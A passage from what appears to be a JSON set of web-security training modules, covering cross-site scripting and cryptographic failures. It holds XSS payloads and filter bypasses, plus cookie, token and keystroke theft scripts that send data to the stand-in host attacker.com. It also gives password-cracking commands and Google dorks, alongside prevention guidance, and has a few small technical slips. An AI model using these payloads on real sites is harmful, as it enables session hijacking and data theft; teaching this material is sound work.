-->\n<script>alert('XSS')</script>\n\n<!-- Case insensitive -->\n<ScRiPt>alert('XSS')</ScRiPt>\n\n<!-- Without closing tags -->\n<img src=x onerror=alert('XSS')>\n\n<!-- Event handlers -->\n<body onload=alert('XSS')>\n\n<!-- CSS with JavaScript -->\n<div style=\"background-image: url(javascript:alert('XSS'))\">\n```\n\n2. Advanced XSS Techniques:\n\nFilter Bypass Techniques:\n```html\n<!-- HTML entity encoding bypass -->\n&lt;script&gt;alert('XSS')&lt;/script&gt;  (if double-decoding)\n\n<!-- Mixed encoding -->\n<scr%69pt>alert('XSS')</scr%69pt>  (URL encoding)\n\n<!-- Comment bypass -->\n<!--<script>--><script>alert('XSS')</script><!--</script>-->\n\n<!-- CDATA bypass -->\n<![CDATA[<script>alert('XSS')</script>]]>\n\n<!-- Base64 encoding -->\n<script src=\"data:text/javascript;base64,YWxlcnQoJ1hTUycp\"></script>\n```\n\nContext-Specific Payloads:\n```html\n<!-- In HTML attribute -->\n\" onmouseover=alert('XSS')\n\n<!-- In JavaScript string -->\n'; alert('XSS'); //\n\n<!-- In CSS -->\n</style><script>alert('XSS')</script>\n\n<!-- In URL -->\njavascript:alert('XSS')\n\n<!-- In JSON (if not properly escaped) -->\n{\"name\": \"<script>alert('XSS')</script>\"}\n```\n\nDOM-Based XSS:\n```javascript\n// Vulnerable code\nvar hash = document.location.hash.substring(1);\nvar element = document.getElementById('content');\nelement.innerHTML = hash;\n\n// Attack URL\nhttps://example.com/page#content=<script>alert('XSS')</script>\n\n// Alternative sinks\nelement.innerHTML = userInput;  // Dangerous\nelement.textContent = userInput; // Safe\nelement.setAttribute('href', userInput); // Dangerous if javascript:\n```\n\n3. Browser Security Mechanisms:\n\nSame-Origin Policy (SOP):\n```text\nSOP RESTRICTIONS:\n- Protocol, domain, port must match\n- Cookies, localStorage, DOM access blocked cross-origin\n- XMLHttpRequest/AJAX blocked for cross-origin by default\n\nSOP BYPASSES:\n- CORS misconfiguration\n- JSONP endpoints\n- Adobe Flash (deprecated)\n- DNS rebinding attacks\n```\n\nContent Security Policy (CSP):\n```text\nCSP HEADER EXAMPLES:\nContent-Security-Policy: default-src 'self'\nContent-Security-Policy: script-src 'self' 'unsafe-inline'\nContent-Security-Policy: script-src 'nonce-abc123'\n\nCSP BYPASS TECHNIQUES:\n- 'unsafe-inline' allows inline scripts\n- Missing object-src allows <object> tags\n- Weak base-uri allows base tag injection\n- JSONP callbacks if allowed\n```\n\nXSS Auditor and Filters:\n```text\nBROWSER XSS FILTERS:\n- Chrome XSS Auditor\n- Internet Explorer XSS Filter\n- Edge XSS Filter\n\nFILTER BYPASS:\n- Fragmentation: <scr<script>ipt>\n- Unusual syntax: <script /src=\"//evil.com/xss.js\" />\n- Encoding tricks: <script>eval('\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74');</script>\n```\n\n4. XSS Exploitation Techniques:\n\nCookie Stealing:\n```javascript\n// Basic cookie theft\n<script>\n  var img = new XMLHttpRequest();\n  img.open('GET', 'https://attacker.com/steal?cookie=' + document.cookie);\n  img.send();\n</script>\n\n// With CORS\n<script>\n  fetch('https://attacker.com/steal', {\n    method: 'POST',\n    body: document.cookie,\n    mode: 'no-cors'\n  });\n</script>\n```\n\nKeylogger Implementation:\n```javascript\n// JavaScript keylogger\n<script>\nvar keys = '';\ndocument.onkeypress = function(e) {\n  keys += e.key;\n  if (keys.length > 50) {\n    fetch('https://attacker.com/log?keys=' + encodeURIComponent(keys));\n    keys = '';\n  }\n};\n</script>\n```\n\nSession Hijacking:\n```javascript\n// Session token theft\n<script>\nvar token = localStorage.getItem('session_token');\nif (token) {\n  var img = new Image();\n  img.src = 'https://attacker.com/steal?token=' + token;\n}\n</script>\n```\n\nCSRF via XSS:\n```javascript\n// CSRF attack through XSS\nvar xhr = new XMLHttpRequest();\nxhr.open('POST', '/api/change-password');\nxhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\nxhr.send('password=evilpassword');\n```\n\n5. Advanced XSS Vectors:\n\nBlind XSS:\n```text\nBLIND XSS CONCEPT:\n- Payload stored but not visible to attacker\n- Triggered when admin views content\n- Requires out-of-band detection\n\nPAYLOADS:\n<script src=\"//attacker.com/xss.js\"></script>\n<img src=x onerror=\"this.src='//attacker.com/log?'+document.cookie\">\n\nDETECTION:\n- Use XSS Hunter, EzXSS, or custom logging endpoint\n- Monitor DNS requests or HTTP callbacks\n```\n\nSelf-XSS:\n```text\nSELF-XSS LIMITATIONS:\n- Requires user to execute payload themselves\n- Not exploitable remotely\n- Often out-of-scope for bug bounties\n\nTRICKS TO MAKE EXPLOITABLE:\n- Social engineering to make user paste payload\n- Combine with other vulnerabilities\n- Use in stored XSS scenarios\n```\n\nMIME Sniffing Attacks:\n```text\nMIME CONFUSION:\n- Server serves XSS payload as text/plain\n- Browser interprets as HTML due to content sniffing\n\nEXPLOIT:\nContent-Type: text/plain\n<script>alert('XSS')</script>\n```\n\n6. Prevention Strategies:\n\nInput Validation and Sanitization:\n```javascript\n// Client-side validation (not sufficient alone)\nfunction sanitizeInput(input) {\n  return input.replace(/[<>]/g, '');\n}\n\n// Server-side validation\nconst validator = require('validator');\nconst cleanInput = validator.escape(userInput);\n```\n\nOutput Encoding:\n```php\n// PHP HTML encoding\nhtmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');\n\n// JavaScript encoding\nconst safeJS = userInput.replace(/[<>\"']/g, function(match) {\n  return {\n    '<': '\\u003c',\n    '>': '\\u003e',\n    '\"': '\\u0022',\n    \"'\": '\\u0027'\n  }[match];\n});\n```\n\nContent Security Policy Implementation:\n```text\nSTRONG CSP:\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-random123';\n  style-src 'self' 'nonce-random123';\n  img-src 'self' data: https:;\n  font-src 'self' data:;\n  connect-src 'self';\n  media-src 'self';\n  object-src 'none';\n  child-src 'self';\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n\nCSP MONITORING:\nContent-Security-Policy-Report-Only: [policy]; report-uri /csp-report\n```\n\nSecure Coding Practices:\n```javascript\n// Safe DOM manipulation\nconst element = document.createElement('div');\nelement.textContent = userInput; // Safe\nelement.innerHTML = userInput;    // Dangerous\n\ndocument.body.appendChild(element);\n\n// Safe event handlers\nelement.addEventListener('click', function() {\n  // Safe code\n});\n```\n\n7. Testing Methodology:\n\nManual XSS Testing:\n```text\nBASIC PAYLOADS:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n\nCONTEXT-SPECIFIC:\n\" onfocus=alert(1) autofocus=\n' onmouseover=alert(1) \njavascript:alert(1)\n\nFILTER BYPASS:\n<scr<script>ipt>alert(1)</scr<script>ipt>\n<scri%70t>alert(1)</scri%70t>\n```\n\nAutomated XSS Scanning:\n```bash\n# XSStrike\npython xsstrike.py -u \"https://example.com/search?q=test\" --crawl\n\n# Dalfox\n./dalfox url \"https://example.com\" -b https://attacker.com/callback\n\n# XSSer\ngxsser -u \"https://example.com\" --cookie \"session=abc123\"\n```\n\nDOM XSS Testing:\n```javascript\n// Test DOM sinks\ndocument.write(userInput);      // Dangerous\ndocument.writeln(userInput);    // Dangerous\nelement.innerHTML = userInput;   // Dangerous\nelement.outerHTML = userInput;   // Dangerous\neval(userInput);                // Dangerous\nsetTimeout(userInput, 100);     // Dangerous\n```\n\nWHAT TO LOOK FOR:\n- **Input Reflection**: User input appearing in HTML, JavaScript, or attributes\n- **Unsafe Sinks**: innerHTML, document.write, eval usage\n- **Missing Encoding**: Raw user input in HTML or JavaScript contexts\n- **Weak CSP**: Overly permissive Content Security Policy\n- **DOM Manipulation**: Client-side code modifying DOM with user input\n- **JSON Injection**: User data in JSON responses without proper escaping\n- **Event Handlers**: User input in onclick, onload, etc.\n\nSECURITY IMPLICATIONS:\n- **Session Hijacking**: Stealing authentication cookies and tokens\n- **Data Theft**: Accessing local storage, session storage, or sensitive data\n- **Account Compromise**: Changing passwords, email addresses, or security settings\n- **Malware Distribution**: Injecting malicious scripts or redirecting to exploit kits\n- **Defacement**: Modifying page content for reputation damage\n- **CSRF Exploitation**: Performing actions on behalf of authenticated users\n\nCOMMON PITFALLS:\n- **Encoding Confusion**: Different encoding requirements for different contexts\n- **CSP Complexity**: Difficult to implement correctly without breaking functionality\n- **DOM XSS Detection**: Harder to find than reflected/stored XSS\n- **Filter Evasion**: Modern filters catch obvious payloads but miss sophisticated ones\n- **Browser Differences**: XSS behavior varies between browsers\n- **MIME Type Confusion**: Content sniffing can lead to unexpected XSS\n- **Self-XSS**: Technically XSS but often not exploitable or in-scope\n- **JSON Security**: Forgetting that JSON responses can contain XSS if parsed incorrectly\n\nTOOLS REFERENCE:\n- **XSStrike**: https://github.com/s0md3v/XSStrike (Advanced XSS scanner)\n- **Dalfox**: https://github.com/hahwul/dalfox (Blind XSS scanner)\n- **XSSer**: https://github.com/epsylon/xsser (XSS automation)\n- **XSS Hunter**: https://xsshunter.com/ (Blind XSS detection)\n- **CSP Evaluator**: https://csp-evaluator.withgoogle.com/ (CSP analysis)\n- **DOMPurify**: https://github.com/cure53/DOMPurify (HTML sanitization)\n\nFURTHER READING:\n- OWASP XSS: https://owasp.org/www-community/attacks/xss/\n- XSS Prevention: https://owasp.org/www-community/attacks/DOM_Based_XSS\n- Content Security Policy: https://owasp.org/www-community/controls/Content_Security_Policy\n- DOM XSS: https://owasp.org/www-community/attacks/DOM_Based_XSS\n- XSS Filter Evasion: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet\n- CSP Guide: https://content-security-policy.com/\n- Browser Security: https://html5sec.org/",
      "tags": ["xss", "cross-site-scripting", "csp", "dom-xss", "client-side-security"]
    },
    {
      "id": "cryptographic-failures",
      "title": "Cryptographic Failures & Data Exposure",
      "content": "OBJECTIVE: Understand cryptographic principles, identify weak implementations, and learn to test for data exposure vulnerabilities in modern web applications.\n\nACADEMIC BACKGROUND:\nCryptographic failures rose to #2 in OWASP Top 10 2021, reflecting the prevalence of sensitive data exposure. Understanding cryptography requires knowledge of encryption algorithms, key management, TLS, and secure data handling. Poor crypto implementation is responsible for major breaches.\n\nSTEP-BY-STEP PROCESS:\n\n1. Cryptographic Fundamentals:\n\nEncryption Types:\n```text\nSYMMETRIC ENCRYPTION:\n- Same key for encryption/decryption\n- Fast, used for bulk data\n- Examples: AES-256, ChaCha20\n\nASYMMETRIC ENCRYPTION:\n- Public/private key pair\n- Slower, used for key exchange\n- Examples: RSA-2048, ECDSA\n\nHASH FUNCTIONS:\n- One-way functions for integrity\n- Examples: SHA-256, BLAKE2\n- Used for passwords (with salt)\n\nDIGITAL SIGNATURES:\n- Prove authenticity and integrity\n- Examples: RSA-PSS, Ed25519\n```\n\nKey Management:\n```text\nKEY LIFECYCLE:\n1. Generation: Secure random generation\n2. Storage: Hardware Security Modules (HSM)\n3. Distribution: Secure key exchange\n4. Rotation: Regular key updates\n5. Revocation: Emergency key invalidation\n6. Destruction: Secure key deletion\n\nCOMMON MISTAKES:\n- Hardcoded keys in source code\n- Weak key generation (Math.random())\n- Keys in environment variables\n- No key rotation policy\n- Reusing keys across environments\n```\n\n2. TLS/SSL Vulnerabilities:\n\nSSL/TLS Misconfigurations:\n```text\nWEAK CIPHER SUITES:\n- RC4 (broken)\n- 3DES (weak)\n- TLS 1.0/1.1 (deprecated)\n- EXPORT ciphers (backdoored)\n\nPROTOCOL DOWNDOWNGRADE:\n- POODLE (SSLv3 fallback)\n- FREAK (export RSA)\n- Logjam (weak DH parameters)\n\nCERTIFICATE ISSUES:\n- Self-signed certificates\n- Expired certificates\n- Wrong domain certificates\n- Revoked certificates\n```\n\nSSL/TLS Testing:\n```bash\n# SSL Labs test\ncurl -s \"https://www.ssllabs.com/ssltest/analyze.html?d=example.com&latest\"\n\n# TestSSL.sh comprehensive scan\ntestssl.sh example.com\n\n# SSLyze quick check\nsslyze --regular example.com\n\n# OpenSSL client test\nopenssl s_client -connect example.com:443 -servername example.com\n```\n\n3. Data Exposure Vulnerabilities:\n\nSensitive Data in Transit:\n```text\nHTTP INSTEAD OF HTTPS:\n- All sensitive data sent in cleartext\n- Authentication cookies exposed\n- Session hijacking trivial\n\nMIXED CONTENT:\n- HTTPS page loading HTTP resources\n- Breaks confidentiality guarantees\n- Vulnerable to MITM attacks\n\nWEAK ENCRYPTION:\n- DES/3DES instead of AES\n- MD5/SHA1 instead of SHA256\n- Insufficient key lengths\n```\n\nData at Rest Exposure:\n```text\nDATABASE LEAKS:\n- Unencrypted sensitive fields\n- Weak password hashing\n- Exposed connection strings\n\nFILE SYSTEM EXPOSURE:\n- Backup files with sensitive data\n- Log files with PII\n- Configuration files with secrets\n\nMEMORY DUMPS:\n- Sensitive data in memory\n- Swap file exposure\n- Core dump leaks\n```\n\n4. Password Security Issues:\n\nWeak Password Storage:\n```text\nBROKEN HASHING:\n- Plain text passwords\n- MD5/SHA1 without salt\n- Fast hashing (no key stretching)\n\nVULNERABLE CODE:\n// DON'T DO THIS\npassword_hash = md5(password);\n\n// DO THIS INSTEAD\npassword_hash = password_hash(password, PASSWORD_ARGON2ID, [\n  'memory_cost' => 65536,\n  'time_cost' => 4,\n  'threads' => 3\n]);\n```\n\nPassword Cracking Testing:\n```bash\n# Hashcat for GPU cracking\nhashcat -m 0 -a 3 hashes.txt rockyou.txt\n\n# John the Ripper\njohn hashes.txt --wordlist=rockyou.txt\n\n# Test weak password policies\n# Check minimum length, complexity requirements\n# Test password reset mechanisms\n```\n\n5. API Key and Token Exposure:\n\nHardcoded Secrets:\n```javascript\n// Exposed in JavaScript\nconst API_KEY = \"sk-1234567890abcdef\";\nconst STRIPE_PUBLISHABLE = \"pk_live_...\";\n\n// In source code\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n\n// In configuration files\nconfig/database.yml with production credentials\n```\n\nToken Storage Issues:\n```text\nLOCAL STORAGE RISKS:\nlocalStorage.setItem('token', jwt_token);  // Exposed to XSS\n\nSESSION STORAGE:\nsessionStorage.setItem('token', jwt_token);  // Slightly better\n\nSECURE STORAGE:\n- HttpOnly cookies\n- Secure flag set\n- SameSite protection\n```\n\n6. Encryption Implementation Flaws:\n\nPadding Oracle Attacks:\n```text\nPADDING ORACLE CONCEPT:\n- Attacker can decrypt ciphertext\n- By observing padding error messages\n- Bit-by-bit decryption possible\n\nVULNERABLE CODE:\ntry {\n  decrypted = aes_decrypt(ciphertext, key);\n} catch (Exception e) {\n  if (e.message.contains(\"padding\")) {\n    return \"Invalid padding\";\n  }\n}\n```\n\nECB Mode Issues:\n```text\nECB MODE PROBLEM:\n- Identical plaintext blocks encrypt identically\n- Patterns remain visible in ciphertext\n- Birthday attacks possible\n\nVISUAL DEMONSTRATION:\nPlaintext: \"attack at dawn!\"\nECB ciphertext shows repeated patterns\n\nSECURE ALTERNATIVE:\nUse CBC, GCM, or CTR modes\n```\n\n7. Key Management Vulnerabilities:\n\nWeak Key Generation:\n```javascript\n// BROKEN: Math.random()\nconst key = Math.random().toString(36).substring(2);\n\n// BROKEN: Date-based\nconst key = Date.now().toString();\n\n// SECURE: Crypto.getRandomValues()\nconst key = crypto.getRandomValues(new Uint8Array(32));\n```\n\nKey Storage Problems:\n```text\nINSECURE STORAGE:\n- Keys in source code\n- Keys in environment variables\n- Keys in configuration files\n- Keys in databases\n\nSECURE STORAGE:\n- Hardware Security Modules (HSM)\n- Key Management Services (AWS KMS, Azure Key Vault)\n- Envelope encryption\n- Key rotation policies\n```\n\n8. Testing Methodology:\n\nCryptographic Testing:\n```bash\n# Check for hardcoded secrets\ngrep -r \"password\\\\|secret\\\\|key\\\\|token\" --include=\"*.js\" --include=\"*.py\" --include=\"*.config\" .\n\n# Test password policies\n# Check minimum length, complexity, history\n\n# SSL/TLS configuration\ntestssl.sh -U example.com\n\n# Certificate validation\nopenssl s_client -connect example.com:443 -servername example.com < /dev/null\n```\n\nData Exposure Hunting:\n```text\nSEARCH PATTERNS:\n- Email addresses: [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}\n- Credit cards: \\\\b\\\\d{4}[ -]?\\\\d{4}[ -]?\\\\d{4}[ -]?\\\\d{4}\\\\b\n- SSNs: \\\\b\\\\d{3}-\\\\d{2}-\\\\d{4}\\\\b\n- API keys: [A-Za-z0-9_-]{20,}\n\nGOOGLE DORKS:\nsite:example.com filetype:sql \"password\"\nsite:example.com filetype:log \"error\"\nsite:example.com inurl:backup\n```\n\n9. Prevention Strategies:\n\nSecure Implementation:\n```python\n# Secure password hashing\nimport bcrypt\n\npassword = \"user_password\"\nsalt = bcrypt.gensalt()\nhashed = bcrypt.hashpw(password.encode('utf-8'), salt)\n\n# Verify\nif bcrypt.checkpw(password.encode('utf-8'), hashed):\n    print(\"Password matches\")\n```\n\nTLS Configuration:\n```nginx\n# Strong SSL configuration\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;\nssl_prefer_server_ciphers off;\nssl_session_cache shared:SSL:10m;\nssl_session_timeout 10m;\n\n# HSTS\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;\n```\n\nData Protection:\n```text\nENCRYPTION AT REST:\n- Database encryption\n- File system encryption\n- Backup encryption\n\nENCRYPTION IN TRANSIT:\n- TLS 1.3 everywhere\n- Certificate pinning\n- Perfect forward secrecy\n\nDATA MINIMIZATION:\n- Don't store unnecessary PII\n- Implement data retention policies\n- Use tokenization for sensitive data\n```\n\nWHAT TO LOOK FOR:\n- **Weak Encryption**: Outdated algorithms, insufficient key lengths\n- **Data in Transit**: HTTP usage, weak SSL/TLS, mixed content\n- **Data at Rest**: Unencrypted databases, weak password hashing\n- **Key Management**: Hardcoded keys, poor key storage\n- **Token Exposure**: JWT in localStorage, API keys in JavaScript\n- **Certificate Issues**: Self-signed, expired, or misconfigured certificates\n- **Configuration Files**: Exposed secrets in config files or source code\n\nSECURITY IMPLICATIONS:\n- **Data Breach**: Exposure of sensitive customer information\n- **Financial Loss**: Stolen payment data, fraudulent transactions\n- **Identity Theft**: PII exposure leading to account takeover\n- **Regulatory Fines**: GDPR, CCPA violations for data exposure\n- **Reputation Damage**: Public disclosure of security failures\n- **Legal Liability**: Class action lawsuits from affected users\n\nCOMMON PITFALLS:\n- **Encryption Obsession**: Focusing on encryption while ignoring key management\n- **SSL Complacency**: Assuming HTTPS means security\n- **Password Policies**: Weak requirements allowing easy cracking\n- **Secret Management**: Poor handling of API keys and tokens\n- **Data Classification**: Not identifying what data needs protection\n- **Compliance Confusion**: Meeting standards but missing actual security\n- **Performance Trade-offs**: Choosing weak crypto for speed\n- **Third-Party Risks**: Vulnerable dependencies and supply chain issues\n\nTOOLS REFERENCE:\n- **TestSSL.sh**: https://github.com/drwetter/testssl.sh (SSL/TLS testing)\n- **SSLyze**: https://github.com/nabla-c0d3/sslyze (SSL scanner)\n- **TruffleHog**: https://github.com/trufflesecurity/trufflehog (Secret scanning)\n- **Hashcat**: https://hashcat.net/hashcat/ (Password cracking)\n- **John the Ripper**: https://www.openwall.com/john/ (Password auditing)\n- **OWASP ZAP**: https://www.zaproxy.org/ (Data exposure testing)\n\nFURTHER READING:\n- OWASP Cryptographic Failures: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure\n- SSL/TLS Best Practices: https://ssl-config.mozilla.org/\n- Key Management: https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final\n- Password Storage: https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\n- Data Encryption: https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final\n- JWT Security: https://tools.ietf.org/html/rfc8725\n- HSTS Preloading: https://hstspreload.org/",
      "tags": ["cryptography", "data-exposure", "ssl-tls", "password-security", "key-management"]
    }
  ]
}